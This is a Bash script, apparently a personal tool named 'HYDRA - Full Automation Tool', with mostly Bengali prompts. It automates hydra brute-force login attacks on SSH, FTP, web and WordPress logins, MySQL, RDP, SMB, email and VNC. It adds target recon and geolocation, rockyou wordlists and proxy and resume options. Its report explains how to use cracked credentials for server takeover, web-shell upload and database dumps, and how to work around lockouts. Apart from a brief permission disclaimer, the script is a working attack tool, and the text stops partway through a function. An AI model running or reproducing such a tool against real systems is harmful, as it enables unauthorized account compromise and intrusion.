#!/bin/bash

# ================================================================
#   HYDRA - Full Automation Tool
#   Author: SAIMUM
# ================================================================

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

RESULTS_DIR="$HOME/hydra_results"
HISTORY_FILE="$HOME/.hydra_saimum_history.log"
mkdir -p "$RESULTS_DIR"

# Common wordlists
WL_ROCKYOU="/usr/share/wordlists/rockyou.txt"
WL_FASTTRACK="/usr/share/wordlists/fasttrack.txt"
WL_COMMON_PASS="/usr/share/wordlists/metasploit/common_passwords.txt"
WL_COMMON_USER="/usr/share/wordlists/metasploit/unix_users.txt"

# ================================================================
# BANNER
# ================================================================
show_banner() {
    clear
    echo -e "${RED}${BOLD}"
    echo ' ██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ '
    echo ' ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗'
    echo ' ███████║ ╚████╔╝ ██║  ██║██████╔╝███████║'
    echo ' ██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║'
    echo ' ██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║'
    echo ' ╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝'
    echo -e "${NC}"
    echo -e "${YELLOW}${BOLD}    ╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}${BOLD}    ║                    S A I M U M                        ║${NC}"
    echo -e "${YELLOW}${BOLD}    ╚═══════════════════════════════════════════════════════╝${NC}"
    echo -e "${DIM}${WHITE}           Hydra Full Automation Tool | Login Brute Force${NC}"
    echo ""
}

# ================================================================
# CHECK DEPENDENCIES
# ================================================================
check_deps() {
    echo -e "${CYAN}[*] Dependencies চেক করা হচ্ছে...${NC}"
    local missing=()
    for tool in hydra whois curl dig; do
        if ! command -v "$tool" &>/dev/null; then
            missing+=("$tool")
            echo -e "  ${RED}[✗] $tool — পাওয়া যায়নি${NC}"
        else
            echo -e "  ${GREEN}[✓] $tool${NC}"
        fi
    done

    echo ""
    echo -e "${CYAN}[*] Wordlist চেক করা হচ্ছে...${NC}"
    for wl in "$WL_ROCKYOU" "$WL_FASTTRACK"; do
        if [ -f "$wl" ]; then
            echo -e "  ${GREEN}[✓] $wl${NC}"
        else
            echo -e "  ${YELLOW}[!] $wl — নেই${NC}"
        fi
    done

    if [ ${#missing[@]} -ne 0 ]; then
        echo ""
        echo -e "${RED}[!] Missing: ${missing[*]}${NC}"
        echo -e "${YELLOW}[*] Install করুন: sudo apt install hydra${NC}"
        exit 1
    fi
    echo ""
}

# ================================================================
# WHOIS LOOKUP
# ================================================================
whois_lookup() {
    local domain=$1
    echo -e "${MAGENTA}${BOLD}┌─── WHOIS INFORMATION ─────────────────────────────┐${NC}"
    local result
    result=$(whois "$domain" 2>/dev/null | grep -E \
        "Registrar:|Registrant Name:|Country:|Creation Date:|Organization:" \
        | head -10)
    if [ -n "$result" ]; then
        echo "$result" | while IFS= read -r line; do
            echo -e "  ${WHITE}$line${NC}"
        done
    else
        echo -e "  ${YELLOW}[!] Whois data পাওয়া যায়নি।${NC}"
    fi
    echo -e "${MAGENTA}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# GEOIP LOOKUP
# ================================================================
geoip_lookup() {
    local domain=$1
    echo -e "${BLUE}${BOLD}┌─── GEO IP INFORMATION ────────────────────────────┐${NC}"
    local geo
    geo=$(curl -s --max-time 5 "http://ip-api.com/json/$domain" 2>/dev/null)
    if echo "$geo" | grep -q '"status":"success"'; then
        local country region city isp
        country=$(echo "$geo" | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
        region=$(echo  "$geo" | grep -o '"regionName":"[^"]*"' | cut -d'"' -f4)
        city=$(echo    "$geo" | grep -o '"city":"[^"]*"'       | cut -d'"' -f4)
        isp=$(echo     "$geo" | grep -o '"isp":"[^"]*"'        | cut -d'"' -f4)
        echo -e "  ${WHITE}Country   :${NC} ${GREEN}$country${NC}"
        echo -e "  ${WHITE}Region    :${NC} ${GREEN}$region${NC}"
        echo -e "  ${WHITE}City      :${NC} ${GREEN}$city${NC}"
        echo -e "  ${WHITE}ISP       :${NC} ${GREEN}$isp${NC}"
    else
        echo -e "  ${YELLOW}[!] GeoIP data পাওয়া যায়নি।${NC}"
    fi
    echo -e "${BLUE}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# REVERSE DNS
# ================================================================
reverse_dns() {
    local domain=$1
    echo -e "${GREEN}${BOLD}┌─── REVERSE DNS LOOKUP ────────────────────────────┐${NC}"
    local ip result
    ip=$(dig +short "$domain" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
    result=$(dig -x "$ip" +short 2>/dev/null)
    echo -e "  ${WHITE}Domain    :${NC} ${GREEN}$domain${NC}"
    echo -e "  ${WHITE}IP        :${NC} ${GREEN}${ip:-পাওয়া যায়নি}${NC}"
    echo -e "  ${WHITE}Hostname  :${NC} ${GREEN}${result:-কোনো rDNS রেকর্ড নেই}${NC}"
    echo -e "${GREEN}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# SERVICE PORT PRE-CHECK
# ================================================================
service_precheck() {
    local target=$1
    local port=$2
    local proto=$3

    echo -e "${CYAN}${BOLD}┌─── SERVICE PRE-CHECK ─────────────────────────────┐${NC}"
    echo -e "  ${WHITE}Target    :${NC} ${GREEN}$target${NC}"
    echo -e "  ${WHITE}Protocol  :${NC} ${YELLOW}$proto${NC}"
    echo -e "  ${WHITE}Port      :${NC} ${CYAN}$port${NC}"
    echo ""

    # Port open check
    echo -e "  ${CYAN}[*] Port $port check করা হচ্ছে...${NC}"
    if timeout 5 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null; then
        echo -e "  ${GREEN}[✓] Port $port OPEN — service চলছে।${NC}"
    else
        echo -e "  ${RED}[!] Port $port CLOSED বা filtered — attack কাজ নাও করতে পারে।${NC}"
        read -p "$(echo -e ${YELLOW}"  তবুও চালাবেন? (y/n): "${NC})" cont
        [[ ! "$cont" =~ ^[Yy]$ ]] && return 1
    fi

    # Banner grab
    local banner
    banner=$(timeout 3 bash -c "echo '' | nc -w 2 $target $port 2>/dev/null" | head -2)
    [ -n "$banner" ] && echo -e "  ${WHITE}Banner    :${NC} ${DIM}$banner${NC}"

    echo -e "${CYAN}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
    return 0
}

# ================================================================
# PRE-SCAN RECON
# ================================================================
pre_scan_recon() {
    local target=$1
    local domain
    domain=$(echo "$target" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
    echo ""
    echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${RED}${BOLD}   PRE-SCAN RECON  ›  $target${NC}"
    echo -e "${RED}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    whois_lookup "$domain"
    geoip_lookup "$domain"
    reverse_dns  "$domain"
}

# ================================================================
# STEP 1 — TARGET
# ================================================================
get_targets() {
    TARGETS=()

    echo -e "${RED}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║      STEP 1 — TARGET                 ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${GREEN}1)${NC} Single target    ${DIM}IP বা domain${NC}"
    echo -e "  ${GREEN}2)${NC} Multiple targets ${DIM}একটা একটা করে${NC}"
    echo -e "  ${GREEN}3)${NC} File থেকে list"
    echo ""
    read -p "$(echo -e ${YELLOW}"Select [1-3]: "${NC})" ttype

    case $ttype in
        1)
            read -p "$(echo -e ${WHITE}"Target IP/Domain: "${NC})" t
            TARGETS=("$t")
            ;;
        2)
            echo -e "${WHITE}একটা একটা করে দিন। শেষ হলে 'done':${NC}"
            while true; do
                read -p "$(echo -e ${WHITE}"Target: "${NC})" t
                [[ "$t" == "done" || -z "$t" ]] && break
                TARGETS+=("$t")
            done
            ;;
        3)
            read -p "$(echo -e ${WHITE}"File path: "${NC})" fpath
            if [ ! -f "$fpath" ]; then
                echo -e "${RED}[!] File নেই।${NC}"
                get_targets; return
            fi
            while IFS= read -r line; do
                [[ -z "$line" || "$line" == \#* ]] && continue
                TARGETS+=("$line")
            done < "$fpath"
            echo -e "${GREEN}[✓] ${#TARGETS[@]} টি target লোড।${NC}"
            ;;
        *)
            echo -e "${RED}[!] ভুল অপশন।${NC}"
            get_targets; return
            ;;
    esac

    [ ${#TARGETS[@]} -eq 0 ] && { echo -e "${RED}[!] কোনো target নেই।${NC}"; get_targets; }
    echo ""
}

# ================================================================
# STEP 2 — PROTOCOL SELECT
# ================================================================
get_protocol() {
    PROTOCOL=""
    PROTO_PORT=""

    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║      STEP 2 — PROTOCOL SELECT                                       ║${NC}"
    echo -e "${RED}${BOLD}╠═══╦═══════════════════╦══════╦══════════════════════════════════════╣${NC}"
    echo -e "${RED}║${NC} ${WHITE}#${NC}  ${RED}║${NC} ${WHITE}Protocol${NC}           ${RED}║${NC} ${WHITE}Port${NC}  ${RED}║${NC} ${WHITE}কী করে${NC}                            ${RED}║${NC}"
    echo -e "${RED}${BOLD}╠═══╬═══════════════════╬══════╬══════════════════════════════════════╣${NC}"
    echo -e "${RED}║${NC} ${GREEN}1${NC}  ${RED}║${NC} SSH                ${RED}║${NC} 22    ${RED}║${NC} Remote server login                ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}2${NC}  ${RED}║${NC} FTP                ${RED}║${NC} 21    ${RED}║${NC} File transfer server               ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}3${NC}  ${RED}║${NC} HTTP POST Form     ${RED}║${NC} 80    ${RED}║${NC} Website login form                 ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}4${NC}  ${RED}║${NC} HTTP GET BasicAuth ${RED}║${NC} 80    ${RED}║${NC} HTTP basic authentication          ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}5${NC}  ${RED}║${NC} HTTPS POST Form    ${RED}║${NC} 443   ${RED}║${NC} SSL website login form             ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}6${NC}  ${RED}║${NC} WordPress Login    ${RED}║${NC} 80    ${RED}║${NC} wp-login.php brute force           ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}7${NC}  ${RED}║${NC} MySQL              ${RED}║${NC} 3306  ${RED}║${NC} Database server                    ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}8${NC}  ${RED}║${NC} RDP                ${RED}║${NC} 3389  ${RED}║${NC} Windows Remote Desktop             ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}9${NC}  ${RED}║${NC} SMB                ${RED}║${NC} 445   ${RED}║${NC} Windows file share                 ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}10${NC} ${RED}║${NC} Telnet             ${RED}║${NC} 23    ${RED}║${NC} Old remote login                   ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}11${NC} ${RED}║${NC} SMTP               ${RED}║${NC} 25    ${RED}║${NC} Email send server                  ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}12${NC} ${RED}║${NC} POP3               ${RED}║${NC} 110   ${RED}║${NC} Email receive (client)             ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}13${NC} ${RED}║${NC} IMAP               ${RED}║${NC} 143   ${RED}║${NC} Email (modern client)              ${RED}║${NC}"
    echo -e "${RED}║${NC} ${GREEN}14${NC} ${RED}║${NC} VNC                ${RED}║${NC} 5900  ${RED}║${NC} Remote desktop (Linux/Mac)         ${RED}║${NC}"
    echo -e "${RED}${BOLD}╚═══╩═══════════════════╩══════╩══════════════════════════════════════╝${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"Protocol select করুন [1-14]: "${NC})" proto_ch

    case $proto_ch in
        1)  PROTOCOL="ssh";             PROTO_PORT="22"   ;;
        2)  PROTOCOL="ftp";             PROTO_PORT="21"   ;;
        3)  PROTOCOL="http-post-form";  PROTO_PORT="80"   ;;
        4)  PROTOCOL="http-get";        PROTO_PORT="80"   ;;
        5)  PROTOCOL="https-post-form"; PROTO_PORT="443"  ;;
        6)  PROTOCOL="http-post-form";  PROTO_PORT="80"   ;;
        7)  PROTOCOL="mysql";           PROTO_PORT="3306" ;;
        8)  PROTOCOL="rdp";             PROTO_PORT="3389" ;;
        9)  PROTOCOL="smb";             PROTO_PORT="445"  ;;
        10) PROTOCOL="telnet";          PROTO_PORT="23"   ;;
        11) PROTOCOL="smtp";            PROTO_PORT="25"   ;;
        12) PROTOCOL="pop3";            PROTO_PORT="110"  ;;
        13) PROTOCOL="imap";            PROTO_PORT="143"  ;;
        14) PROTOCOL="vnc";             PROTO_PORT="5900" ;;
        *)
            echo -e "${RED}[!] ভুল অপশন।${NC}"
            get_protocol; return
            ;;
    esac

    PROTO_CHOICE="$proto_ch"
    echo -e "  ${GREEN}[✓] Protocol: ${BOLD}$PROTOCOL${NC} | Port: ${CYAN}$PROTO_PORT${NC}"
    echo ""
}

# ================================================================
# STEP 3 — PROTOCOL SPECIFIC CONFIG
# ================================================================
get_proto_config() {
    PROTO_CONFIG=""
    CUSTOM_PORT=""
    WP_FORM_STR=""
    HTTP_FORM_STR=""

    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║      STEP 3 — PROTOCOL CONFIG                                       ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Custom port
    read -p "$(echo -e ${WHITE}"Custom port? (Enter = default $PROTO_PORT): "${NC})" port_in
    [ -n "$port_in" ] && CUSTOM_PORT="-s $port_in" && \
        echo -e "  ${GREEN}[✓] Port: $port_in${NC}" || \
        echo -e "  ${GREEN}[✓] Port: $PROTO_PORT (default)${NC}"
    echo ""

    case $PROTO_CHOICE in

        # ── HTTP POST FORM (3) ─────────────────────────────────
        3|5)
            echo -e "  ${CYAN}HTTP POST Form config:${NC}"
            echo -e "  ${DIM}  Format: /login/path:user_field=^USER^&pass_field=^PASS^:fail_string${NC}"
            echo ""
            read -p "$(echo -e ${WHITE}"  Login page path (e.g. /login, /admin/login.php): "${NC})" form_path
            read -p "$(echo -e ${WHITE}"  Username field name (e.g. username, user, email): "${NC})" user_field
            read -p "$(echo -e ${WHITE}"  Password field name (e.g. password, pass, pwd): "${NC})" pass_field
            read -p "$(echo -e ${WHITE}"  Login fail string (login fail হলে কী দেখায়, e.g. 'Invalid', 'incorrect'): "${NC})" fail_str
            HTTP_FORM_STR="${form_path}:${user_field}=^USER^&${pass_field}=^PASS^:F=${fail_str}"
            PROTO_CONFIG="\"$HTTP_FORM_STR\""
            echo -e "  ${GREEN}[✓] Form: $HTTP_FORM_STR${NC}"
            ;;

        # ── WORDPRESS (6) ─────────────────────────────────────
        6)
            echo -e "  ${CYAN}WordPress Login config:${NC}"
            echo -e "  ${DIM}  wp-login.php automatically set হবে।${NC}"
            WP_FORM_STR="/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=ERROR"
            PROTO_CONFIG="\"$WP_FORM_STR\""
            echo -e "  ${GREEN}[✓] WordPress form string auto-set।${NC}"
            ;;

        # ── MySQL (7) ─────────────────────────────────────────
        7)
            echo -e "  ${CYAN}MySQL config:${NC}"
            read -p "$(echo -e ${WHITE}"  Database name (Enter = mysql): "${NC})" db_name
            [ -n "$db_name" ] && PROTO_CONFIG="-m $db_name" || PROTO_CONFIG="-m mysql"
            echo -e "  ${GREEN}[✓] Database: ${db_name:-mysql}${NC}"
            ;;

        # ── SSH, FTP, RDP, SMB, Telnet, VNC ──────────────────
        1|2|8|9|10|14)
            echo -e "  ${GREEN}[✓] $PROTOCOL — extra config দরকার নেই।${NC}"
            ;;

        # ── SMTP / POP3 / IMAP ────────────────────────────────
        11|12|13)
            echo -e "  ${CYAN}Email server SSL?${NC}"
            read -p "$(echo -e ${WHITE}"  SSL ব্যবহার করবেন? (y/n): "${NC})" ssl_yn
            if [[ "$ssl_yn" =~ ^[Yy]$ ]]; then
                PROTOCOL="${PROTOCOL}s"
                echo -e "  ${GREEN}[✓] SSL mode চালু: $PROTOCOL${NC}"
            fi
            ;;
    esac
    echo ""
}

# ================================================================
# STEP 4 — CREDENTIALS CONFIG
# ================================================================
get_credentials() {
    USER_OPT=""
    PASS_OPT=""
    COMBO_OPT=""

    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║      STEP 4 — CREDENTIALS CONFIG                                    ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Username or Combo list
    echo -e "  ${CYAN}Username:${NC}"
    echo -e "  ${GREEN}1)${NC} Single username"
    echo -e "  ${GREEN}2)${NC} Username list file"
    echo -e "  ${GREEN}3)${NC} Combo list  ${DIM}(user:pass একসাথে এক file এ)${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"  Select [1-3]: "${NC})" user_ch

    case $user_ch in
        1)
            read -p "$(echo -e ${WHITE}"  Username: "${NC})" uname
            USER_OPT="-l $uname"
            echo -e "  ${GREEN}[✓] Username: $uname${NC}"
            ;;
        2)
            echo ""
            echo -e "  ${CYAN}  Username wordlist:${NC}"
            echo -e "  ${GREEN}  1)${NC} unix_users.txt   ${DIM}(common unix users)${NC}"
            echo -e "  ${GREEN}  2)${NC} Custom file"
            read -p "$(echo -e ${YELLOW}"  Select [1-2]: "${NC})" uwl_ch
            if [ "$uwl_ch" == "2" ]; then
                read -p "$(echo -e ${WHITE}"  File path: "${NC})" uwl_path
                USER_OPT="-L $uwl_path"
            else
                USER_OPT="-L $WL_COMMON_USER"
                [ ! -f "$WL_COMMON_USER" ] && {
                    read -p "$(echo -e ${WHITE}"  File নেই। Custom path দিন: "${NC})" uwl_path
                    USER_OPT="-L $uwl_path"
                }
            fi
            echo -e "  ${GREEN}[✓] Username list set।${NC}"
            ;;
        3)
            read -p "$(echo -e ${WHITE}"  Combo file path (format: user:pass): "${NC})" combo_path
            COMBO_OPT="-C $combo_path"
            USER_OPT=""
            echo -e "  ${GREEN}[✓] Combo list: $combo_path${NC}"
            ;;
    esac

    # Password (skip if combo)
    if [ -z "$COMBO_OPT" ]; then
        echo ""
        echo -e "  ${CYAN}Password:${NC}"
        echo -e "  ${GREEN}1)${NC} Single password"
        echo -e "  ${GREEN}2)${NC} rockyou.txt        ${DIM}(14M passwords)${NC}"
        echo -e "  ${GREEN}3)${NC} fasttrack.txt      ${DIM}(ছোট, common passwords)${NC}"
        echo -e "  ${GREEN}4)${NC} Custom wordlist"
        echo ""
        read -p "$(echo -e ${YELLOW}"  Select [1-4]: "${NC})" pass_ch

        case $pass_ch in
            1)
                read -p "$(echo -e ${WHITE}"  Password: "${NC})" pword
                PASS_OPT="-p $pword"
                echo -e "  ${GREEN}[✓] Password set।${NC}"
                ;;
            2)
                PASS_OPT="-P $WL_ROCKYOU"
                [ ! -f "$WL_ROCKYOU" ] && {
                    echo -e "  ${RED}[!] rockyou.txt নেই।${NC}"
                    read -p "$(echo -e ${WHITE}"  Custom path: "${NC})" cp
                    PASS_OPT="-P $cp"
                }
                echo -e "  ${GREEN}[✓] Wordlist: rockyou.txt${NC}"
                ;;
            3)
                PASS_OPT="-P $WL_FASTTRACK"
                [ ! -f "$WL_FASTTRACK" ] && {
                    echo -e "  ${RED}[!] fasttrack.txt নেই।${NC}"
                    read -p "$(echo -e ${WHITE}"  Custom path: "${NC})" cp
                    PASS_OPT="-P $cp"
                }
                echo -e "  ${GREEN}[✓] Wordlist: fasttrack.txt${NC}"
                ;;
            4)
                read -p "$(echo -e ${WHITE}"  Wordlist path: "${NC})" wl_path
                PASS_OPT="-P $wl_path"
                echo -e "  ${GREEN}[✓] Custom wordlist set।${NC}"
                ;;
        esac
    fi

    # Threads
    echo ""
    echo -e "  ${CYAN}Threads (parallel connections):${NC}"
    echo -e "  ${DIM}  SSH/RDP: কম রাখুন (4-8), HTTP: বেশি দিতে পারেন (16-32)${NC}"
    read -p "$(echo -e ${WHITE}"  Threads (Enter = 16): "${NC})" th_in
    THREAD_OPT="-t ${th_in:-16}"
    echo -e "  ${GREEN}[✓] Threads: ${th_in:-16}${NC}"

    # Timeout
    echo ""
    read -p "$(echo -e ${WHITE}"  Timeout per try, seconds (Enter = 30): "${NC})" to_in
    TIMEOUT_OPT="-w ${to_in:-30}"
    echo -e "  ${GREEN}[✓] Timeout: ${to_in:-30}s${NC}"
    echo ""
}

# ================================================================
# STEP 5 — EXTRA OPTIONS
# ================================================================
get_extra_options() {
    PROXY_OPT=""
    VERBOSE_OPT=""
    EXIT_FIRST_OPT=""
    RESUME_OPT=""
    LOOP_OPT=""

    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║      STEP 5 — EXTRA OPTIONS (সব optional, Enter = skip)            ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Proxy
    read -p "$(echo -e ${WHITE}"Proxy ব্যবহার করবেন? (y/n): "${NC})" proxy_yn
    if [[ "$proxy_yn" =~ ^[Yy]$ ]]; then
        read -p "$(echo -e ${WHITE}"  Proxy (e.g. socks5://127.0.0.1:9050): "${NC})" proxy_in
        PROXY_OPT="-u $proxy_in"
        echo -e "  ${GREEN}[✓] Proxy: $proxy_in${NC}"
    fi

    # Exit on first found
    echo ""
    read -p "$(echo -e ${WHITE}"প্রথম valid credential পাওয়ার পর বন্ধ হবে? (y/n, recommended: y): "${NC})" exit_yn
    [[ "$exit_yn" =~ ^[Yy]$ ]] && EXIT_FIRST_OPT="-f" && \
        echo -e "  ${GREEN}[✓] Exit on first found: ON${NC}"

    # Verbose
    echo ""
    read -p "$(echo -e ${WHITE}"Verbose mode? প্রতিটি attempt দেখাবে (y/n): "${NC})" vb_yn
    [[ "$vb_yn" =~ ^[Yy]$ ]] && VERBOSE_OPT="-V" && \
        echo -e "  ${GREEN}[✓] Verbose: ON${NC}"

    # Resume
    echo ""
    read -p "$(echo -e ${WHITE}"আগের একটা বন্ধ হওয়া scan resume করবেন? (y/n): "${NC})" res_yn
    [[ "$res_yn" =~ ^[Yy]$ ]] && RESUME_OPT="-R" && \
        echo -e "  ${GREEN}[✓] Resume: ON${NC}"

    # Loop users
    echo ""
    read -p "$(echo -e ${WHITE}"সব password দিয়ে সব user try করবেন? loop mode (y/n): "${NC})" loop_yn
    [[ "$loop_yn" =~ ^[Yy]$ ]] && LOOP_OPT="-u" && \
        echo -e "  ${GREEN}[✓] Loop users: ON${NC}"

    echo ""
}

# ================================================================
# BUILD & RUN
# ================================================================
build_and_run() {
    local target=$1
    local ts
    ts=$(date +"%Y%m%d_%H%M%S")
    local safe
    safe=$(echo "$target" | sed 's|[^a-zA-Z0-9._-]|_|g')
    local out_file="$RESULTS_DIR/hydra_${PROTOCOL}_${safe}_${ts}.txt"

    # Build command
    local final_cmd
    if [ -n "$COMBO_OPT" ]; then
        final_cmd=$(echo "hydra $target $PROTOCOL \
            $COMBO_OPT \
            $CUSTOM_PORT \
            $PROTO_CONFIG \
            $THREAD_OPT \
            $TIMEOUT_OPT \
            $PROXY_OPT \
            $EXIT_FIRST_OPT \
            $VERBOSE_OPT \
            $RESUME_OPT \
            $LOOP_OPT \
            -o $out_file" | tr -s ' ')
    else
        final_cmd=$(echo "hydra $target $PROTOCOL \
            $USER_OPT \
            $PASS_OPT \
            $CUSTOM_PORT \
            $PROTO_CONFIG \
            $THREAD_OPT \
            $TIMEOUT_OPT \
            $PROXY_OPT \
            $EXIT_FIRST_OPT \
            $VERBOSE_OPT \
            $RESUME_OPT \
            $LOOP_OPT \
            -o $out_file" | tr -s ' ')
    fi

    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║      CONFIRM & RUN                                                  ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${WHITE}Target    : ${GREEN}${BOLD}$target${NC}"
    echo -e "  ${WHITE}Protocol  : ${CYAN}${BOLD}$PROTOCOL${NC}"
    echo -e "  ${WHITE}Command   : ${YELLOW}$final_cmd${NC}"
    echo -e "  ${WHITE}Output    : ${CYAN}$out_file${NC}"
    echo ""
    echo -e "  ${RED}[!] শুধুমাত্র নিজের বা permission আছে এমন target এ ব্যবহার করুন!${NC}"
    echo -e "  ${RED}[!] অন্যের system এ brute force করা সাইবার ক্রাইম।${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"[?] Attack শুরু করবেন? (y/n): "${NC})" go
    [[ ! "$go" =~ ^[Yy]$ ]] && return

    # Service pre-check
    service_precheck "$target" "$PROTO_PORT" "$PROTOCOL" || return

    local tmp_scan tmp_bangla
    tmp_scan=$(mktemp)
    tmp_bangla=$(mktemp)

    echo ""
    echo -e "${GREEN}${BOLD}[*] Hydra attack শুরু হচ্ছে...${NC}"
    echo ""

    # Real Hydra — হুবহু original terminal output
    eval "$final_cmd" 2>&1 | tee "$tmp_scan"

    echo ""
    echo -e "${GREEN}${BOLD}[✓] Attack সম্পন্ন!${NC}"

    bangla_analysis   "$tmp_scan" "$tmp_bangla" "$target" "$PROTOCOL"
    suggest_next_tool "$tmp_scan" "$PROTOCOL"
    save_results      "$tmp_scan" "$tmp_bangla" "$out_file" "$target"

    rm -f "$tmp_scan" "$tmp_bangla"
}

# ================================================================
# BANGLA ANALYSIS
# ================================================================
bangla_analysis() {
    local outfile=$1
    local report_file=$2
    local target=$3
    local protocol=$4

    {
    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║             বাংলায় স্ক্যান রিপোর্ট বিশ্লেষণ                      ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local critical=0 high=0 medium=0 info=0

    # Valid credentials found
    if grep -qi "\[.*\].*login:\|valid password\|host:.*login:" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}🚨 Valid Credentials পাওয়া গেছে!${NC}"
        grep -i "\[.*\].*login:\|host:.*login:" "$outfile" | head -5 | while read -r line; do
            echo -e "     ${YELLOW}→ $line${NC}"
        done
        echo ""

        case $protocol in
            ssh)
                echo -e "     ${WHITE}→ SSH দিয়ে সরাসরি server এ login করা সম্ভব।${NC}"
                echo -e "     ${WHITE}→ Root access থাকলে পুরো server কব্জা সম্ভব।${NC}"
                ;;
            ftp)
                echo -e "     ${WHITE}→ FTP দিয়ে server এ file upload/download সম্ভব।${NC}"
                echo -e "     ${WHITE}→ Web shell upload করে RCE নেওয়া সম্ভব।${NC}"
                ;;
            http-post-form|https-post-form)
                echo -e "     ${WHITE}→ Web application এ login করা সম্ভব।${NC}"
                echo -e "     ${WHITE}→ Admin panel access পেলে site পুরো control এ আসবে।${NC}"
                ;;
            mysql)
                echo -e "     ${WHITE}→ Database এ সরাসরি access।${NC}"
                echo -e "     ${WHITE}→ পুরো database dump করা সম্ভব।${NC}"
                ;;
            rdp)
                echo -e "     ${WHITE}→ Windows desktop সরাসরি access।${NC}"
                echo -e "     ${WHITE}→ পুরো Windows system কব্জা সম্ভব।${NC}"
                ;;
            smb)
                echo -e "     ${WHITE}→ Windows file share access।${NC}"
                echo -e "     ${WHITE}→ Network এর সব shared files দেখা সম্ভব।${NC}"
                ;;
            vnc)
                echo -e "     ${WHITE}→ Remote desktop graphical access।${NC}"
                echo -e "     ${WHITE}→ Screen দেখা ও control করা সম্ভব।${NC}"
                ;;
            smtp|pop3|imap|smtps|pop3s|imaps)
                echo -e "     ${WHITE}→ Email account এ access।${NC}"
                echo -e "     ${WHITE}→ সব email পড়া ও পাঠানো সম্ভব।${NC}"
                ;;
            telnet)
                echo -e "     ${WHITE}→ Remote shell access (plaintext)।${NC}"
                echo -e "     ${WHITE}→ সব command চালানো সম্ভব।${NC}"
                ;;
        esac
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
    fi

    # Attack statistics
    local attempts
    attempts=$(grep -c "login\|attempt\|trying" "$outfile" 2>/dev/null || echo "0")
    if [ "$attempts" -gt 0 ]; then
        info=$((info+1))
        echo -e "  ${WHITE}${BOLD}📊 Attack Statistics${NC}"
        echo -e "     ${WHITE}→ মোট attempt: $attempts${NC}"
        echo -e "     ${GREEN}→ ঝুঁকি: INFO${NC}"; echo ""
    fi

    # Connection errors / lockout
    if grep -qi "too many connections\|connection refused\|error.*connect\|account.*locked\|too many failures" "$outfile" 2>/dev/null; then
        medium=$((medium+1))
        echo -e "  ${CYAN}${BOLD}ℹ Connection Issue / Account Lockout!${NC}"
        echo -e "     ${WHITE}→ Target account lock বা rate limiting চালু আছে।${NC}"
        echo -e "     ${WHITE}→ Delay বাড়িয়ে বা thread কমিয়ে আবার চেষ্টা করুন।${NC}"
        echo -e "     ${CYAN}→ ঝুঁকি: MEDIUM${NC}"; echo ""
    fi

    # No valid found
